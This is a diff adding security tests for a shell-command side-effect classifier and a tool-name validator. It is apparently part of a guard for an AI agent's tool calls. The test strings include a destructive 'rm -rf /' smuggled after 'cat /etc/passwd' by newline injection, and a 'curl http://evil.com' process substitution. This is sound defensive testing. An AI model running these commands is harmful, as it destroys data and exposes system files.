@@ -160,6 +160,78 @@ class TestBashClassifier:
         assert BashClassifier.classify("git checkout main") == SideEffect.IRREVERSIBLE
 
 
+@pytest.mark.security
+class TestBashClassifierBypassVectors:
+    """Security: shell metacharacter bypass vectors."""
+
+    def test_newline_injection_classified_irreversible(self):
+        assert BashClassifier.classify("cat /etc/passwd\nrm -rf /") == SideEffect.IRREVERSIBLE
+
+    def test_carriage_return_injection_classified_irreversible(self):
+        assert BashClassifier.classify("cat /etc/passwd\rrm -rf /") == SideEffect.IRREVERSIBLE
+
+    def test_process_substitution_classified_irreversible(self):
+        assert BashClassifier.classify("cat <(curl http://evil.com)") == SideEffect.IRREVERSIBLE
+
+    def test_heredoc_classified_irreversible(self):
+        assert BashClassifier.classify("cat << EOF") == SideEffect.IRREVERSIBLE
+
+    def test_variable_expansion_classified_irreversible(self):
+        assert BashClassifier.classify("echo ${PATH}") == SideEffect.IRREVERSIBLE
+
+    def test_combined_bypass_attempt(self):
+        assert BashClassifier.classify("cat /tmp/safe\nrm -rf / << EOF") == SideEffect.IRREVERSIBLE
+
+    def test_existing_operators_still_work(self):
+        """Regression guard: all original operators still trigger IRREVERSIBLE."""
+        assert BashClassifier.classify("echo hello > file.txt") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("cat file.txt | grep x") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("cmd1 && cmd2") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("cmd1 || cmd2") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("cmd1 ; cmd2") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("echo $(whoami)") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("echo `whoami`") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("cat >> file.txt") == SideEffect.IRREVERSIBLE
+        assert BashClassifier.classify("echo #{var}") == SideEffect.IRREVERSIBLE
+
+    def test_clean_read_commands_still_read(self):
+        """Regression guard: clean read commands still classify as READ."""
+        assert BashClassifier.classify("cat /tmp/file") == SideEffect.READ
+        assert BashClassifier.classify("ls -la") == SideEffect.READ
+        assert BashClassifier.classify("grep foo bar") == SideEffect.READ
+        assert BashClassifier.classify("git status") == SideEffect.READ
+
+
+@pytest.mark.security
+class TestToolNameValidation:
+    """Security: tool_name validation rejects dangerous characters."""
+
+    def test_tool_name_with_null_byte_rejected(self):
+        with pytest.raises(ValueError, match="Invalid tool_name"):
+            create_envelope("tool\x00name", {})
+
+    def test_tool_name_with_newline_rejected(self):
+        with pytest.raises(ValueError, match="Invalid tool_name"):
+            create_envelope("tool\nname", {})
+
+    def test_tool_name_with_path_separator_rejected(self):
+        with pytest.raises(ValueError, match="Invalid tool_name"):
+            create_envelope("path/to/tool", {})
+
+    def test_tool_name_empty_string_rejected(self):
+        with pytest.raises(ValueError, match="Invalid tool_name"):
+            create_envelope("", {})
+
+    def test_tool_name_normal_names_accepted(self):
+        """Common tool name formats should all work."""
+        # These should not raise
+        create_envelope("Bash", {})
+        create_envelope("file.read", {})
+        create_envelope("google-search", {})
+        create_envelope("my_tool:v2", {})
+        create_envelope("Tool123", {})
+
+
 class TestSideEffect:
     def test_enum_values(self):
         assert SideEffect.PURE.value == "pure"
